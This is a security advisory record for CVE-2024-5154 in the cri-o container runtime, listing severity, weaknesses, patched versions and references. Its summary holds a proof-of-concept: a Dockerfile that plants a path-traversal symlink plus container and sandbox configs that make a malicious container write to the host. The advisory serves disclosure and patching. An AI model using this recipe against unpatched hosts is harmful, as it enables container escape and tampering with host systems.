advisory_id: GHSA-j9hf-98c3-wrm8
datasource_id: github_osv_importer_v2/GHSA-j9hf-98c3-wrm8
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-j9hf-98c3-wrm8/GHSA-j9hf-98c3-wrm8.json
aliases:
  - CVE-2024-5154
summary: "malicious container creates symlink \"mtab\" on the host External\n### Impact\nA malicious\
  \ container can affect the host by taking advantage of code cri-o added to show the container\
  \ mounts on the host.\n\nA workload built from this Dockerfile:\n```\nFROM docker.io/library/busybox\
  \ as source\nRUN mkdir /extra && cd /extra && ln -s ../../../../../../../../root etc\n\nFROM\
  \ scratch\n\nCOPY --from=source /bin /bin\nCOPY --from=source /lib /lib\nCOPY --from=source\
  \ /extra .\n\n```\n\nand this container config:\n\n```\n{\n  \"metadata\": {\n      \"name\"\
  : \"busybox\"\n  },\n  \"image\":{\n      \"image\": \"localhost/test\"\n  },\n  \"command\"\
  : [\n      \"/bin/true\"\n  ],\n  \"linux\": {\n  }\n}\n\n\n```\nand this sandbox config \
  \ \n```\n{\n  \"metadata\": {\n    \"name\": \"test-sandbox\",\n    \"namespace\": \"default\"\
  ,\n    \"attempt\": 1,\n    \"uid\": \"edishd83djaideaduwk28bcsb\"\n  },\n  \"linux\": {\n\
  \    \"security_context\": {\n      \"namespace_options\": {\n        \"network\": 2\n   \
  \   }\n    }\n  }\n}\n\n```\n\nwill create a file on host `/host/mtab`\n\n### Patches\n1.30.1,\
  \ 1.29.5, 1.28.7\n\n### Workarounds\nUnfortunately not\n\n### References\n_Are there any links\
  \ users can visit to find out more?_"
impacted_packages: []
severities:
  - score: '8.1'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:H/I:H/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-j9hf-98c3-wrm8/GHSA-j9hf-98c3-wrm8.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-668
  - CWE-22
references:
  - url: https://access.redhat.com/security/cve/CVE-2024-5154
    reference_type:
    reference_id:
  - url: https://github.com/cri-o/cri-o
    reference_type:
    reference_id:
  - url: https://github.com/cri-o/cri-o/security/advisories/GHSA-j9hf-98c3-wrm8
    reference_type:
    reference_id:
  - url: https://pkg.go.dev/vuln/GO-2024-2919
    reference_type:
    reference_id:
  - url: https://bugzilla.redhat.com/show_bug.cgi?id=2280190
    reference_type: bug
    reference_id: 2280190
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-5154
    reference_type:
    reference_id: CVE-2024-5154
  - url: https://access.redhat.com/errata/RHSA-2024:10818
    reference_type:
    reference_id: RHSA-2024:10818
  - url: https://access.redhat.com/errata/RHSA-2024:3676
    reference_type:
    reference_id: RHSA-2024:3676
  - url: https://access.redhat.com/errata/RHSA-2024:3700
    reference_type:
    reference_id: RHSA-2024:3700
  - url: https://access.redhat.com/errata/RHSA-2024:4008
    reference_type:
    reference_id: RHSA-2024:4008
  - url: https://access.redhat.com/errata/RHSA-2024:4159
    reference_type:
    reference_id: RHSA-2024:4159
  - url: https://access.redhat.com/errata/RHSA-2024:4486
    reference_type:
    reference_id: RHSA-2024:4486
